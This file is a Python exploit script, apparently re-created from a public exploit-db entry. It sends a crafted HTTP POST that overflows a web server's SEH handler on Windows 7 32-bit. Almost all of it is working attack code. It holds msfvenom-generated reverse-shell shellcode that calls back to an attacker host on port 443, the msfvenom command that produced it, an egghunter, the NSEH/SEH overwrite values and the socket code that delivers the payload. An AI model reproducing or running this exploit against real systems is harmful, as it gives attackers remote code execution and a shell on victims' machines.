#!/usr/bin/python
#Re-created for Windows 7 Professional SP1 32-bit
#Original: https://www.exploit-db.com/exploits/41003/

import socket

IP = '192.168.10.140'
PORT = 80

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.131 LPORT=443 -f python -a x86 --platform windows -b "\x00\x0a\x0d\x09\x20"
buf =  ""
buf += "\xd9\xec\xbd\xb1\xe1\xa4\x1c\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x52\x83\xc2\x04\x31\x6a\x13\x03\xdb\xf2\x46"
buf += "\xe9\xe7\x1d\x04\x12\x17\xde\x69\x9a\xf2\xef\xa9\xf8"
buf += "\x77\x5f\x1a\x8a\xd5\x6c\xd1\xde\xcd\xe7\x97\xf6\xe2"
buf += "\x40\x1d\x21\xcd\x51\x0e\x11\x4c\xd2\x4d\x46\xae\xeb"
buf += "\x9d\x9b\xaf\x2c\xc3\x56\xfd\xe5\x8f\xc5\x11\x81\xda"
buf += "\xd5\x9a\xd9\xcb\x5d\x7f\xa9\xea\x4c\x2e\xa1\xb4\x4e"
buf += "\xd1\x66\xcd\xc6\xc9\x6b\xe8\x91\x62\x5f\x86\x23\xa2"
buf += "\x91\x67\x8f\x8b\x1d\x9a\xd1\xcc\x9a\x45\xa4\x24\xd9"
buf += "\xf8\xbf\xf3\xa3\x26\x35\xe7\x04\xac\xed\xc3\xb5\x61"
buf += "\x6b\x80\xba\xce\xff\xce\xde\xd1\x2c\x65\xda\x5a\xd3"
buf += "\xa9\x6a\x18\xf0\x6d\x36\xfa\x99\x34\x92\xad\xa6\x26"
buf += "\x7d\x11\x03\x2d\x90\x46\x3e\x6c\xfd\xab\x73\x8e\xfd"
buf += "\xa3\x04\xfd\xcf\x6c\xbf\x69\x7c\xe4\x19\x6e\x83\xdf"
buf += "\xde\xe0\x7a\xe0\x1e\x29\xb9\xb4\x4e\x41\x68\xb5\x04"
buf += "\x91\x95\x60\x8a\xc1\x39\xdb\x6b\xb1\xf9\x8b\x03\xdb"
buf += "\xf5\xf4\x34\xe4\xdf\x9c\xdf\x1f\x88\x62\xb7\x15\xcb"
buf += "\x0b\xca\x29\xca\x70\x43\xcf\xa6\x96\x02\x58\x5f\x0e"
buf += "\x0f\x12\xfe\xcf\x85\x5f\xc0\x44\x2a\xa0\x8f\xac\x47"
buf += "\xb2\x78\x5d\x12\xe8\x2f\x62\x88\x84\xac\xf1\x57\x54"
buf += "\xba\xe9\xcf\x03\xeb\xdc\x19\xc1\x01\x46\xb0\xf7\xdb"
buf += "\x1e\xfb\xb3\x07\xe3\x02\x3a\xc5\x5f\x21\x2c\x13\x5f"
buf += "\x6d\x18\xcb\x36\x3b\xf6\xad\xe0\x8d\xa0\x67\x5e\x44"
buf += "\x24\xf1\xac\x57\x32\xfe\xf8\x21\xda\x4f\x55\x74\xe5"
buf += "\x60\x31\x70\x9e\x9c\xa1\x7f\x75\x25\xd1\x35\xd7\x0c"
buf += "\x7a\x90\x82\x0c\xe7\x23\x79\x52\x1e\xa0\x8b\x2b\xe5"
buf += "\xb8\xfe\x2e\xa1\x7e\x13\x43\xba\xea\x13\xf0\xbb\x3e"

egg = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
NOP = "\x90" * 10

#\x10\x08\x16\xaf POP POP RETN

evil = "" 
evil += "POST "
evil += "T00WT00W" #Egghunter keyword
evil += NOP
evil += buf #Reverse shell
evil += "A" * (2470 - len(buf))
evil += "\x7e\x07\x41\x41" #NSEH
evil += "\xaf\x16\x08\x10" #SEH POP POP RET
evil += "\x90" * 5
evil += egg #Egghunter
evil += "C" * 2504
evil += " HTTP/1.1\r\n"
evil += "Host: 192.168.10.140\r\n"
evil += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
s.send(evil)
print "buffer sent"
s.close()

